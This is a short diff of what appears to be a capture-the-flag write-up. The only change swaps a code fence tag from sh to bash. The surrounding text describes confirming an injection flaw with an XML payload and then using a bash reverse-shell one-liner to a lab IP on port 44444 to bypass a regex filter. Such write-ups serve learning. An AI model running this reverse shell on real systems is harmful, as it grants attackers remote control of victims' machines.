@@ -59,7 +59,7 @@ Also, from inspecting the source code, I saw that the server reads the provided 
 I tried crafting a PoC XML payload to test:
 ![](/images/Pasted%20image%2020260424091109.png)
 As in the output, the timestamp value got evaluated to 2. So it is indeed vulnerable. Since the regex filter is really strict that I cannot directly embed a reverse shell payload in, I'm gonna make it execute a shell script:
-```sh
+```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.15.103/44444 0>&1
 ```
